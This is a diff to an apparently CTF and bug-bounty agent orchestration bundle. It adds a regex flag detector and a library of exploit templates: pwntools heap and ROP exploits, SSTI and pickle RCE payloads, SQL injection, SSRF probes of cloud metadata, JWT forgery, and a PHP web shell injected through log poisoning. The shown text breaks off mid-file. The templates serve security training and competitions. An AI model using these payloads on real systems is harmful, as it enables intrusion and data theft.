@@ -14093,6 +14093,27 @@ var CapabilityProfilesSchema = exports_external.object({
   ctf: TargetCapabilitySchema.default(DEFAULT_CAPABILITY_PROFILES.ctf),
   bounty: TargetCapabilitySchema.default(DEFAULT_CAPABILITY_PROFILES.bounty)
 });
+var AutoTriageSchema = exports_external.object({
+  enabled: exports_external.boolean().default(true)
+}).default({ enabled: true });
+var FlagDetectorSchema = exports_external.object({
+  enabled: exports_external.boolean().default(true),
+  custom_patterns: exports_external.array(exports_external.string()).default([])
+}).default({ enabled: true, custom_patterns: [] });
+var PatternMatcherSchema = exports_external.object({
+  enabled: exports_external.boolean().default(true)
+}).default({ enabled: true });
+var ReconPipelineSchema = exports_external.object({
+  enabled: exports_external.boolean().default(true),
+  max_commands_per_phase: exports_external.number().int().positive().default(10)
+}).default({ enabled: true, max_commands_per_phase: 10 });
+var DeltaScanSchema = exports_external.object({
+  enabled: exports_external.boolean().default(true),
+  max_age_ms: exports_external.number().int().positive().default(24 * 60 * 60 * 1000)
+}).default({ enabled: true, max_age_ms: 86400000 });
+var ReportGeneratorSchema = exports_external.object({
+  enabled: exports_external.boolean().default(true)
+}).default({ enabled: true });
 var OrchestratorConfigSchema = exports_external.object({
   enabled: exports_external.boolean().default(true),
   enable_builtin_mcps: exports_external.boolean().default(true),
@@ -14141,7 +14162,13 @@ var OrchestratorConfigSchema = exports_external.object({
   auto_dispatch: AutoDispatchSchema.default(AutoDispatchSchema.parse({})),
   routing: RoutingSchema.default(DEFAULT_ROUTING),
   capability_profiles: CapabilityProfilesSchema.default(DEFAULT_CAPABILITY_PROFILES),
-  skill_autoload: SkillAutoloadSchema
+  skill_autoload: SkillAutoloadSchema,
+  auto_triage: AutoTriageSchema,
+  flag_detector: FlagDetectorSchema,
+  pattern_matcher: PatternMatcherSchema,
+  recon_pipeline: ReconPipelineSchema,
+  delta_scan: DeltaScanSchema,
+  report_generator: ReportGeneratorSchema
 });
 
 // src/config/loader.ts
@@ -14441,7 +14468,9 @@ var ROUTE_AGENT_MAP = {
   "bounty-triage": "bounty-triage",
   "bounty-research": "bounty-research",
   "deep-plan": "deep-plan",
-  "md-scribe": "md-scribe"
+  "md-scribe": "md-scribe",
+  "aegis-explore": "aegis-explore",
+  "aegis-librarian": "aegis-librarian"
 };
 function currentRouting(config2) {
   return config2?.routing ?? DEFAULT_ROUTING;
@@ -15727,6 +15756,144 @@ function extractBashCommand(metadata) {
     }
   }
   return "";
+}
+
+// src/orchestration/flag-detector.ts
+var DEFAULT_FLAG_PATTERNS = [
+  /flag\{[^}]{1,200}\}/gi,
+  /CTF\{[^}]{1,200}\}/gi,
+  /picoCTF\{[^}]{1,200}\}/gi,
+  /htb\{[^}]{1,200}\}/gi,
+  /TCTF\{[^}]{1,200}\}/gi,
+  /SECCON\{[^}]{1,200}\}/gi,
+  /ASIS\{[^}]{1,200}\}/gi,
+  /CCTF\{[^}]{1,200}\}/gi,
+  /hxp\{[^}]{1,200}\}/gi,
+  /PCTF\{[^}]{1,200}\}/gi,
+  /dice\{[^}]{1,200}\}/gi,
+  /uiuctf\{[^}]{1,200}\}/gi,
+  /ictf\{[^}]{1,200}\}/gi,
+  /actf\{[^}]{1,200}\}/gi,
+  /zer0pts\{[^}]{1,200}\}/gi
+];
+var candidates = [];
+var customPattern = null;
+function cloneAsGlobalRegex(pattern) {
+  const flags = pattern.flags.includes("g") ? pattern.flags : `${pattern.flags}g`;
+  return new RegExp(pattern.source, flags);
+}
+function confidenceForFlag(flag) {
+  const trimmed = flag.trim();
+  if (!trimmed || trimmed.length < 6 || trimmed.length > 220) {
+    return "low";
+  }
+  const hasWhitespace = /\s/.test(trimmed);
+  const hasBalancedBraces = trimmed.includes("{") && trimmed.endsWith("}");
+  if (hasBalancedBraces && !hasWhitespace) {
+    return "high";
+  }
+  if (hasBalancedBraces) {
+    return "medium";
+  }
+  return "low";
+}
+function inferFormat(flag) {
+  const openBrace = flag.indexOf("{");
+  if (openBrace <= 0) {
+    return "unknown";
+  }
+  return `${flag.slice(0, openBrace)}{...}`;
+}
+function dedupe(items) {
+  const seen = new Set;
+  const output = [];
+  for (const item of items) {
+    const key = `${item.flag}|${item.source}`;
+    if (seen.has(key)) {
+      continue;
+    }
+    seen.add(key);
+    output.push(item);
+  }
+  return output;
+}
+function setCustomFlagPattern(pattern) {
+  const normalized = pattern.trim();
+  if (!normalized) {
+    customPattern = null;
+    return;
+  }
+  try {
+    customPattern = new RegExp(normalized, "gi");
+  } catch {
+    throw new Error(`Invalid custom flag pattern: ${pattern}`);
+  }
+}
+function scanForFlags(text, source) {
+  const safeText = text ?? "";
+  if (!safeText) {
+    return [];
+  }
+  const safeSource = source.trim() || "unknown";
+  const now = Date.now();
+  const patterns = customPattern ? [customPattern, ...DEFAULT_FLAG_PATTERNS] : DEFAULT_FLAG_PATTERNS;
+  const found = [];
+  for (const pattern of patterns) {
+    const globalRegex = cloneAsGlobalRegex(pattern);
+    const matches = safeText.matchAll(globalRegex);
+    for (const match of matches) {
+      const raw = match[0]?.trim() ?? "";
+      if (!raw) {
+        continue;
+      }
+      found.push({
+        flag: raw,
+        format: inferFormat(raw),
+        source: safeSource,
+        confidence: confidenceForFlag(raw),
+        timestamp: now
+      });
+    }
+  }
+  const uniqueFound = dedupe(found);
+  if (uniqueFound.length === 0) {
+    return [];
+  }
+  const existingKeys = new Set(candidates.map((c) => `${c.flag}|${c.source}`));
+  for (const candidate of uniqueFound) {
+    const key = `${candidate.flag}|${candidate.source}`;
+    if (existingKeys.has(key)) {
+      continue;
+    }
+    candidates.push(candidate);
+    existingKeys.add(key);
+  }
+  return uniqueFound;
+}
+function getCandidates() {
+  return [...candidates].sort((a, b) => b.timestamp - a.timestamp);
+}
+function buildFlagAlert(flagCandidates) {
+  if (!flagCandidates || flagCandidates.length === 0) {
+    return "";
+  }
+  const lines = [
+    `Potential flags detected (${flagCandidates.length}):`,
+    "Treat these as CANDIDATES until official verifier confirms Correct/Accepted."
+  ];
+  for (const candidate of flagCandidates) {
+    lines.push(`- ${candidate.flag} | format=${candidate.format} | confidence=${candidate.confidence} | source=${candidate.source}`);
+  }
+  return lines.join(`
+`);
+}
+function containsFlag(text) {
+  const safeText = text ?? "";
+  if (!safeText) {
+    return false;
+  }
+  const patterns = customPattern ? [customPattern, ...DEFAULT_FLAG_PATTERNS] : DEFAULT_FLAG_PATTERNS;
+  return patterns.some((pattern) => cloneAsGlobalRegex(pattern).test(safeText));
 }
 
 // src/state/notes-store.ts
@@ -29859,6 +30026,751 @@ var TEMPLATES = [
       "```"
     ].join(`
 `)
+  },
+  {
+    domain: "PWN",
+    id: "format-string-leak",
+    title: "Format string leak + write skeleton (%p / %n)",
+    body: [
+      "```python",
+      "from pwn import *",
+      "",
+      "context.binary = elf = ELF('./chall')",
+      "HOST, PORT = '127.0.0.1', 1337",
+      "",
+      "def start():",
+      "    return remote(HOST, PORT) if args.REMOTE else process(elf.path)",
+      "",
+      "def leak_stack(io):",
+      "    # TODO: adjust menu prompt and count of leaked slots",
+      "    io.sendlineafter(b'> ', b'%p|' * 16)",
+      "    line = io.recvline(timeout=2) or b''",
+      "    leaks = [x for x in line.strip().split(b'|') if x.startswith(b'0x')]",
+      "    return leaks",
+      "",
+      "def fsb_write_payload(where: int, value: int, offset: int) -> bytes:",
+      "    # TODO: adapt byte/short/int write strategy for target",
+      "    return fmtstr_payload(offset, {where: value}, write_size='short')",
+      "",
+      "io = start()",
+      "leaks = leak_stack(io)",
+      "# TODO: parse PIE/libc/canary from leaks and compute target addr",
+      "# payload = fsb_write_payload(target_addr, target_value, offset=6)",
+      "# io.sendlineafter(b'> ', payload)",
+      "io.interactive()",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "PWN",
+    id: "heap-tcache-poison",
+    title: "Heap tcache poisoning (double-free -> arbitrary write)",
+    body: [
+      "```python",
+      "from pwn import *",
+      "",
+      "context.binary = elf = ELF('./chall')",
+      "",
+      "def alloc(io, idx: int, size: int, data: bytes):",
+      "    io.sendlineafter(b'> ', b'1')",
+      "    io.sendlineafter(b'idx: ', str(idx).encode())",
+      "    io.sendlineafter(b'size: ', str(size).encode())",
+      "    io.sendafter(b'data: ', data)",
+      "",
+      "def free(io, idx: int):",
+      "    io.sendlineafter(b'> ', b'2')",
+      "    io.sendlineafter(b'idx: ', str(idx).encode())",
+      "",
+      "def edit(io, idx: int, data: bytes):",
+      "    io.sendlineafter(b'> ', b'3')",
+      "    io.sendlineafter(b'idx: ', str(idx).encode())",
+      "    io.sendafter(b'data: ', data)",
+      "",
+      "io = process(elf.path)",
+      "",
+      "# 1) Fill tcache bin and create double-free primitive",
+      "alloc(io, 0, 0x60, b'A' * 8)",
+      "alloc(io, 1, 0x60, b'B' * 8)",
+      "free(io, 0)",
+      "free(io, 1)",
+      "free(io, 0)  # double free",
+      "",
+      "# 2) Poison fd pointer to target-0x10 (glibc version dependent)",
+      "target = elf.got.get('free', 0)",
+      "edit(io, 0, p64(target))",
+      "",
+      "# 3) Allocate chunks to land controlled pointer at target",
+      "alloc(io, 2, 0x60, b'C' * 8)",
+      "alloc(io, 3, 0x60, b'D' * 8)",
+      "alloc(io, 4, 0x60, p64(elf.symbols.get('win', 0)))",
+      "",
+      "# TODO: trigger hijacked function pointer/hook",
+      "io.interactive()",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "PWN",
+    id: "rop-chain-builder",
+    title: "ROP chain builder with gadget placeholders",
+    body: [
+      "```python",
+      "from pwn import *",
+      "",
+      "context.binary = elf = ELF('./chall')",
+      "rop = ROP(elf)",
+      "offset =  cyclic_find(0x6161616c)  # TODO: replace with real crash value",
+      "",
+      "# TODO: replace with discovered gadgets from ROPgadget/ropper",
+      "pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]",
+      "ret = rop.find_gadget(['ret'])[0]",
+      "",
+      "payload = flat(",
+      "    b'A' * offset,",
+      "    ret,  # stack alignment for libc calls",
+      "    pop_rdi,",
+      "    next(elf.search(b'/bin/sh\\x00')),  # or libc search after leak",
+      "    elf.plt.get('system', 0),",
+      ")",
+      "",
+      "# TODO: send payload through vulnerable input path",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "PWN",
+    id: "srop-sigreturn",
+    title: "SROP sigreturn frame template (execve/orw)",
+    body: [
+      "```python",
+      "from pwn import *",
+      "",
+      "context.arch = 'amd64'",
+      "context.binary = elf = ELF('./chall')",
+      "",
+      "io = process(elf.path)",
+      "",
+      "syscall_ret = 0x0  # TODO: gadget: syscall; ret",
+      "pop_rax = 0x0      # TODO: gadget: pop rax; ret",
+      "binsh = 0x0        # TODO: writable addr containing b'/bin/sh\\x00'",
+      "",
+      "frame = SigreturnFrame()",
+      "frame.rax = 59   # execve",
+      "frame.rdi = binsh",
+      "frame.rsi = 0",
+      "frame.rdx = 0",
+      "frame.rip = syscall_ret",
+      "",
+      "payload = flat(",
+      "    b'A' * 0x100,  # TODO: overflow offset",
+      "    pop_rax,",
+      "    15,            # rt_sigreturn syscall number",
+      "    syscall_ret,",
+      "    bytes(frame),",
+      ")",
+      "",
+      "io.send(payload)",
+      "io.interactive()",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "PWN",
+    id: "ret2dlresolve",
+    title: "ret2dlresolve template (arbitrary resolver call)",
+    body: [
+      "```python",
+      "from pwn import *",
+      "",
+      "context.binary = elf = ELF('./chall')",
+      "io = process(elf.path)",
+      "rop = ROP(elf)",
+      "offset = 0x100  # TODO: overflow offset",
+      "",
+      "dl = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])",
+      "bss_addr = elf.bss() + 0x800",
+      "",
+      "# Stage 1: read fake structures into memory",
+      "rop.read(0, bss_addr, len(dl.payload))",
+      "rop.ret2dlresolve(dl, bss_addr)",
+      "",
+      "payload = flat({offset: rop.chain()})",
+      "io.send(payload)",
+      "io.send(dl.payload)",
+      "io.interactive()",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "PWN",
+    id: "seccomp-bypass-orw",
+    title: "seccomp bypass via ORW shellcode (open/read/write)",
+    body: [
+      "```python",
+      "from pwn import *",
+      "",
+      "context.arch = 'amd64'",
+      "context.binary = elf = ELF('./chall')",
+      "io = process(elf.path)",
+      "",
+      "flag_path = b'/flag\\x00'",
+      "",
+      "sc = asm(f'''",
+      "    mov rax, 2                /* open */",
+      "    lea rdi, [rip+path]",
+      "    xor rsi, rsi",
+      "    xor rdx, rdx",
+      "    syscall",
+      "    mov rdi, rax              /* fd */",
+      "    mov rax, 0                /* read */",
+      "    mov rsi, rsp",
+      "    mov rdx, 0x100",
+      "    syscall",
+      "    mov rdx, rax              /* nbytes */",
+      "    mov rax, 1                /* write */",
+      "    mov rdi, 1",
+      "    mov rsi, rsp",
+      "    syscall",
+      "    jmp done",
+      "path:",
+      '    .ascii "/flag\\x00"',
+      "done:",
+      "''')",
+      "",
+      "# TODO: use RWX region, mprotect, or stack pivot to run shellcode",
+      "io.send(sc)",
+      "io.interactive()",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "WEB",
+    id: "ssti-jinja2",
+    title: "Jinja2 SSTI probe and RCE payload workflow",
+    body: [
+      "```python",
+      "import requests",
+      "",
+      "URL = 'http://target/render'",
+      "PARAM = 'name'",
+      "",
+      "probes = [",
+      "    '{{7*7}}',",
+      "    '{{config.items()}}',",
+      `    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"`,
+      "]",
+      "",
+      "for p in probes:",
+      "    r = requests.get(URL, params={PARAM: p}, timeout=8)",
+      "    print('payload=', p)",
+      "    print('status=', r.status_code)",
+      "    print('body[:200]=', r.text[:200])",
+      "    print('-' * 40)",
+      "",
+      "# TODO: adapt context variable path (config/request/self) to app version",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "WEB",
+    id: "sqli-union",
+    title: "UNION-based SQLi extraction skeleton",
+    body: [
+      "```python",
+      "import requests",
+      "",
+      "BASE = 'http://target/products'",
+      "PARAM = 'id'",
+      "",
+      "def send(payload: str):",
+      "    return requests.get(BASE, params={PARAM: payload}, timeout=8)",
+      "",
+      "# 1) Find column count",
+      "for i in range(1, 11):",
+      '    r = send(f"1 ORDER BY {i}-- -")',
+      "    print(i, r.status_code)",
+      "",
+      "# 2) Identify printable columns",
+      'payload = "-1 UNION ALL SELECT 1,2,3,4-- -"  # TODO: adjust column count',
+      "r = send(payload)",
+      "print(r.text[:300])",
+      "",
+      "# 3) Extract DB metadata",
+      'payload = "-1 UNION ALL SELECT database(),user(),version(),4-- -"',
+      "print(send(payload).text[:500])",
+      "",
+      "# TODO: enumerate tables/columns for target DB flavor",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "WEB",
+    id: "sqli-blind-boolean",
+    title: "Boolean-based blind SQLi script template",
+    body: [
+      "```python",
+      "import requests",
+      "import string",
+      "",
+      "URL = 'http://target/item'",
+      "PARAM = 'id'",
+      "TRUE_MARKER = 'Welcome'  # TODO: marker that appears only on true",
+      "",
+      "def is_true(condition: str) -> bool:",
+      `    payload = f"1' AND ({condition})-- -"`,
+      "    r = requests.get(URL, params={PARAM: payload}, timeout=8)",
+      "    return TRUE_MARKER in r.text",
+      "",
+      "def extract_value(sql_expr: str, max_len: int = 64) -> str:",
+      "    alphabet = string.ascii_letters + string.digits + '_{}-@.:$'",
+      "    out = ''",
+      "    for pos in range(1, max_len + 1):",
+      "        found = False",
+      "        for ch in alphabet:",
+      `            cond = f"substr(({sql_expr}),{pos},1)='{ch}'"`,
+      "            if is_true(cond):",
+      "                out += ch",
+      "                found = True",
+      "                break",
+      "        if not found:",
+      "            break",
+      "    return out",
+      "",
+      "print(extract_value('select database()'))",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "WEB",
+    id: "ssrf-basic",
+    title: "Basic SSRF exploitation and bypass checklist",
+    body: [
+      "```python",
+      "import requests",
+      "",
+      "ENDPOINT = 'http://target/fetch'",
+      "PARAM = 'url'",
+      "",
+      "targets = [",
+      "    'http://127.0.0.1:80/',",
+      "    'http://localhost/',",
+      "    'http://169.254.169.254/latest/meta-data/',",
+      "    'http://[::1]/',",
+      "    'http://2130706433/',  # 127.0.0.1 as decimal",
+      "]",
+      "",
+      "for t in targets:",
+      "    r = requests.get(ENDPOINT, params={PARAM: t}, timeout=8)",
+      "    print(t, r.status_code, len(r.text))",
+      "",
+      "# TODO: try redirects, DNS rebinding, userinfo (@), mixed schemes (gopher/file)",
+      "```",
+      "",
+      "```text",
+      "1) Compare response size/status/timing to detect internal access.",
+      "2) Probe cloud metadata endpoints and internal admin panels.",
+      '3) If URL validation exists, test parser confusion ("http://allowed@127.0.0.1").',
+      "4) Pivot to exfiltration: SSRF -> internal token/API key -> privileged action.",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "WEB",
+    id: "jwt-forgery",
+    title: "JWT forgery (none alg + key confusion) template",
+    body: [
+      "```python",
+      "import base64",
+      "import json",
+      "import hmac",
+      "import hashlib",
+      "",
+      "def b64u(data: bytes) -> bytes:",
+      "    return base64.urlsafe_b64encode(data).rstrip(b'=')",
+      "",
+      "# Attack 1: alg=none",
+      "header_none = b64u(json.dumps({'typ': 'JWT', 'alg': 'none'}).encode())",
+      "payload = b64u(json.dumps({'sub': 'admin', 'role': 'admin'}).encode())",
+      "token_none = b'.'.join([header_none, payload, b'']).decode()",
+      "print('none token:', token_none)",
+      "",
+      "# Attack 2: HS256 key confusion with exposed RSA public key",
+      "public_key = b'-----BEGIN PUBLIC KEY-----\\n...\\n-----END PUBLIC KEY-----\\n'",
+      "header_hs = b64u(json.dumps({'typ': 'JWT', 'alg': 'HS256'}).encode())",
+      "msg = b'.'.join([header_hs, payload])",
+      "sig = hmac.new(public_key, msg, hashlib.sha256).digest()",
+      "token_confusion = b'.'.join([header_hs, payload, b64u(sig)]).decode()",
+      "print('key-confusion token:', token_confusion)",
+      "",
+      "# TODO: send token via Authorization: Bearer <token> and verify privilege escalation",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "WEB",
+    id: "deserialization-python",
+    title: "Python deserialization (pickle/yaml) exploit skeleton",
+    body: [
+      "```python",
+      "import base64",
+      "import pickle",
+      "import os",
+      "",
+      "class RCE:",
+      "    def __reduce__(self):",
+      "        # TODO: replace command with controlled callback/exfil action",
+      "        return (os.system, ('id',))",
+      "",
+      "payload = pickle.dumps(RCE(), protocol=4)",
+      "print('pickle_b64=', base64.b64encode(payload).decode())",
+      "",
+      `yaml_payload = "!!python/object/apply:os.system ['id']"`,
+      "print('yaml=', yaml_payload)",
+      "",
+      "# TODO: deliver payload to vulnerable pickle.loads / yaml.load (unsafe loader)",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "WEB",
+    id: "lfi-to-rce",
+    title: "LFI -> RCE via log poisoning/filter chains",
+    body: [
+      "```python",
+      "import requests",
+      "",
+      "BASE = 'http://target/index.php'",
+      "LFI_PARAM = 'page'",
+      "",
+      "# 1) Poison access log with PHP payload",
+      `php_payload = '<?php system($_GET["cmd"]); ?>'`,
+      "requests.get(BASE, headers={'User-Agent': php_payload}, timeout=8)",
+      "",
+      "# 2) Include poisoned log file through LFI",
+      "log_paths = [",
+      "    '/var/log/apache2/access.log',",
+      "    '/var/log/nginx/access.log',",
+      "]",
+      "",
+      "for lp in log_paths:",
+      "    r = requests.get(BASE, params={LFI_PARAM: lp, 'cmd': 'id'}, timeout=8)",
+      "    if 'uid=' in r.text:",
+      "        print('RCE via', lp)",
+      "        print(r.text[:300])",
+      "",
+      "# TODO: if wrappers enabled, test php://filter and data:// for alternative chains",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "CRYPTO",
+    id: "rsa-small-e-coppersmith",
+    title: "RSA small-e attack with Coppersmith setup",
+    body: [
+      "```python",
+      "# Requires SageMath environment",
+      "from sageall import *",
+      "",
+      "# Given: c = (m)^e mod N, and m has known prefix",
+      "N = Integer(0)   # TODO",
+      "e = Integer(3)",
+      "c = Integer(0)   # TODO",
+      "known = b'flag{'",
+      "unknown_len = 40  # TODO bytes",
+      "",
+      "PR.<x> = PolynomialRing(Zmod(N))",
+      "m = Integer.from_bytes(known, 'big') * 256**unknown_len + x",
+      "f = (m**e - c).monic()",
+      "",
+      "# beta/epsilon/X depend on bound assumptions",
+      "X = 2**(8 * unknown_len)",
+      "roots = f.small_roots(X=X, beta=1, epsilon=1/20)",
+      "if roots:",
+      "    r = int(roots[0])",
+      "    rec = int(m(x=r)).to_bytes((int(m(x=r)).bit_length() + 7) // 8, 'big')",
+      "    print(rec)",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "CRYPTO",
+    id: "rsa-common-modulus",
+    title: "RSA common modulus attack template",
+    body: [
+      "```python",
+      "from math import gcd",
+      "",
+      "def egcd(a, b):",
+      "    if b == 0:",
+      "        return (a, 1, 0)",
+      "    g, x1, y1 = egcd(b, a % b)",
+      "    return (g, y1, x1 - (a // b) * y1)",
+      "",
+      "def modinv(a, n):",
+      "    g, x, _ = egcd(a, n)",
+      "    if g != 1:",
+      "        raise ValueError('not invertible')",
+      "    return x % n",
+      "",
+      "N = 0      # TODO",
+      "e1 = 0     # TODO",
+      "e2 = 0     # TODO",
+      "c1 = 0     # TODO",
+      "c2 = 0     # TODO",
+      "",
+      "g, a, b = egcd(e1, e2)",
+      "if g != 1:",
+      "    raise ValueError('exponents must be coprime for basic variant')",
+      "",
+      "if a < 0:",
+      "    c1 = modinv(c1, N)",
+      "    a = -a",
+      "if b < 0:",
+      "    c2 = modinv(c2, N)",
+      "    b = -b",
+      "",
+      "m = (pow(c1, a, N) * pow(c2, b, N)) % N",
+      "print(m.to_bytes((m.bit_length() + 7) // 8, 'big'))",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "CRYPTO",
+    id: "aes-cbc-bitflip",
+    title: "AES-CBC bit flipping attack template",
+    body: [
+      "```python",
+      "# Goal: modify plaintext block P_i by flipping bytes in C_{i-1}",
+      "from binascii import hexlify",
+      "",
+      "def bitflip(prev_ct: bytes, known_plain: bytes, desired_plain: bytes) -> bytes:",
+      "    if not (len(prev_ct) == len(known_plain) == len(desired_plain)):",
+      "        raise ValueError('block lengths must match')",
+      "    out = bytearray(prev_ct)",
+      "    for i in range(len(out)):",
+      "        out[i] ^= known_plain[i] ^ desired_plain[i]",
+      "    return bytes(out)",
+      "",
+      "# Example customization",
+      "orig_prev = bytes.fromhex('00' * 16)  # TODO intercepted C_{i-1}",
+      "known = b'role=user;uid=1' + b'\\x00'",
+      "want = b'role=admin;uid=1'",
+      "new_prev = bitflip(orig_prev, known, want)",
+      "print('new_prev_hex=', hexlify(new_prev).decode())",
+      "",
+      "# TODO: replace block in ciphertext and submit token/cookie",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "CRYPTO",
+    id: "hash-length-extension",
+    title: "Hash length extension attack skeleton",
+    body: [
+      "```python",
+      "# pip install hashpumpy",
+      "import hashpumpy",
+      "",
+      "orig_data = 'user=guest&admin=0'",
+      "orig_sig = '0123456789abcdef0123456789abcdef'  # TODO known MAC",
+      "append_data = '&admin=1'",
+      "",
+      "for key_len in range(8, 65):",
+      "    new_sig, new_data = hashpumpy.hashpump(orig_sig, orig_data, append_data, key_len)",
+      "    # TODO: submit new_data/new_sig to verifier endpoint",
+      "    # if accepted: print(key_len, new_sig, repr(new_data)); break",
+      "",
+      "# Note: applicable to Merkle-Damgard hashes (MD5/SHA1/SHA256 naive prefix-MAC)",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "REV",
+    id: "angr-symbolic-exec",
+    title: "angr symbolic execution solve skeleton",
+    body: [
+      "```python",
+      "import angr",
+      "import claripy",
+      "",
+      "BINARY = './chall'",
+      "proj = angr.Project(BINARY, auto_load_libs=False)",
+      "",
+      "arg_len = 32  # TODO",
+      "sym_arg = claripy.BVS('sym_arg', arg_len * 8)",
+      "state = proj.factory.full_init_state(args=[BINARY, sym_arg])",
+      "",
+      "# Restrict charset for speed and realistic input",
+      "for i in range(arg_len):",
+      "    ch = sym_arg.get_byte(i)",
+      "    state.solver.add(ch >= 0x20, ch <= 0x7e)",
+      "",
+      "simgr = proj.factory.simgr(state)",
+      "FIND = 0x401234  # TODO success address",
+      "AVOID = [0x401111]  # TODO fail addresses",
+      "simgr.explore(find=FIND, avoid=AVOID)",
+      "",
+      "if simgr.found:",
+      "    found = simgr.found[0]",
+      "    model = found.solver.eval(sym_arg, cast_to=bytes)",
+      "    print(model)",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "REV",
+    id: "z3-constraint-solver",
+    title: "z3 constraint solver template",
+    body: [
+      "```python",
+      "from z3 import *",
+      "",
+      "s = Solver()",
+      "chars = [BitVec(f'c{i}', 8) for i in range(32)]  # TODO length",
+      "",
+      "for c in chars:",
+      "    s.add(c >= 0x20, c <= 0x7e)",
+      "",
+      "# TODO: translate checks from disassembly/decompiler",
+      "# Example constraints:",
+      "s.add(chars[0] == ord('f'))",
+      "s.add(chars[1] == ord('l'))",
+      "s.add(chars[2] == ord('a'))",
+      "s.add(chars[3] == ord('g'))",
+      "s.add(Sum([ZeroExt(24, c) for c in chars[:8]]) == 700)",
+      "",
+      "if s.check() == sat:",
+      "    m = s.model()",
+      "    out = bytes([m[c].as_long() for c in chars])",
+      "    print(out)",
+      "else:",
+      "    print('unsat')",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "REV",
+    id: "frida-hook-skeleton",
+    title: "Frida hook skeleton for runtime inspection",
+    body: [
+      "```javascript",
+      "// Run: frida -f ./chall -l hook.js --no-pause",
+      "",
+      "const target = Module.findExportByName(null, 'strcmp');",
+      "if (target) {",
+      "  Interceptor.attach(target, {",
+      "    onEnter(args) {",
+      "      this.a0 = Memory.readUtf8String(args[0]);",
+      "      this.a1 = Memory.readUtf8String(args[1]);",
+      "      send({ event: 'strcmp_enter', a0: this.a0, a1: this.a1 });",
+      "    },",
+      "    onLeave(retval) {",
+      "      send({ event: 'strcmp_leave', ret: retval.toInt32() });",
+      "    },",
+      "  });",
+      "}",
+      "",
+      "// TODO: hook custom function by address (Module.base.add(offset))",
+      "```",
+      "",
+      "```python",
+      "# Optional host script to collect Frida messages",
+      "import frida, sys",
+      "",
+      "def on_message(msg, data):",
+      "    print(msg)",
+      "",
+      "session = frida.spawn(['./chall'])",
+      "sess = frida.attach(session)",
+      "with open('hook.js', 'r', encoding='utf-8') as f:",
+      "    script = sess.create_script(f.read())",
+      "script.on('message', on_message)",
+      "script.load()",
+      "frida.resume(session)",
+      "sys.stdin.read()",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "FORENSICS",
+    id: "volatility3-workflow",
+    title: "Volatility 3 memory forensics workflow",
+    body: [
+      "```text",
+      "1) Identify image info/profile hints:",
+      "   python3 vol.py -f memdump.raw windows.info",
+      "",
+      "2) Enumerate processes and suspicious parent-child chains:",
+      "   python3 vol.py -f memdump.raw windows.pslist",
+      "   python3 vol.py -f memdump.raw windows.pstree",
+      "",
+      "3) Inspect command lines and loaded modules:",
+      "   python3 vol.py -f memdump.raw windows.cmdline",
+      "   python3 vol.py -f memdump.raw windows.dlllist --pid <PID>",
+      "",
+      "4) Network and handles triage:",
+      "   python3 vol.py -f memdump.raw windows.netscan",
+      "   python3 vol.py -f memdump.raw windows.handles --pid <PID>",
+      "",
+      "5) Extract memory artifacts:",
+      "   python3 vol.py -f memdump.raw windows.memdump --pid <PID> --dump-dir dumps/",
+      "   python3 vol.py -f memdump.raw windows.filescan",
+      "",
+      "6) Hunt credentials/flags with strings + yara on dumps directory.",
+      "```"
+    ].join(`
+`)
+  },
+  {
+    domain: "FORENSICS",
+    id: "steganography-pipeline",
+    title: "Steganography analysis pipeline (LSB/zsteg/steghide)",
+    body: [
+      "```text",
+      "1) File triage:",
+      "   file sample.png",
+      "   exiftool sample.png",
+      "   binwalk -e sample.png",
+      "",
+      "2) Metadata and raw strings:",
+      "   strings -n 6 sample.png | tee strings.txt",
+      "   xxd sample.png | head",
+      "",
+      "3) PNG/BMP LSB extraction:",
+      "   zsteg -a sample.png",
+      "   zsteg sample.png -E b1,r,lsb > lsb_r_b1.bin",
+      "",
+      "4) Steghide attempt (jpeg/wav commonly):",
+      "   steghide info sample.jpg",
+      "   steghide extract -sf sample.jpg -p '<password>'",
+      "",
+      "5) Visual channel splitting:",
+      "   python3 -m PIL sample.png  # TODO: write script to split RGB/alpha and inspect",
+      "",
+      "6) If archive recovered, validate with file/unzip/7z and recurse.",
+      "```"
+    ].join(`
+`)
   }
 ];
 function listExploitTemplates(domain3) {
@@ -29870,6 +30782,2138 @@ function getExploitTemplate(domain3, id) {
     return null;
   }
   return TEMPLATES.find((t) => t.domain === domain3 && t.id === normalizedId) ?? null;
+}
+
+// src/orchestration/auto-triage.ts
+var EXTENSION_HINTS = [
+  { extensions: [".elf", ".so", ".o", ".out", ".bin"], detectedType: "elf" },
+  { extensions: [".zip", ".tar", ".tgz", ".gz", ".bz2", ".xz", ".7z", ".rar"], detectedType: "archive" },
+  { extensions: [".png", ".jpg", ".jpeg", ".gif", ".bmp", ".webp", ".tif", ".tiff"], detectedType: "image" },
+  { extensions: [".pcap", ".pcapng", ".cap"], detectedType: "pcap" },
+  { extensions: [".pdf"], detectedType: "pdf" },
+  { extensions: [".html", ".htm", ".json", ".xml", ".yaml", ".yml"], detectedType: "web" },
+  {
+    extensions: [".sh", ".py", ".rb", ".pl", ".php", ".js", ".ts", ".lua", ".ps1"],
+    detectedType: "script"
+  }
+];
+var FILE_OUTPUT_HINTS = [
+  { pattern: /\belf\b/i, detectedType: "elf" },
+  {
